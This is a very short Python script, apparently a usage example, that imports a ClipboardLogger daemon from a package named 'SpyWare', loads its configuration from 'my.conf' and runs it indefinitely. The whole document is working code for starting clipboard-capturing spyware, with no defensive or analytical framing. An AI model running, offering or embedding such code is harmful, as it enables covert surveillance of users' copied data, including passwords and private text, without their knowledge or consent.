from SpyWare.ClipboardLogger import Daemon, clipboardConfig

clipboardConfig("my.conf")

Daemon().run_for_ever()
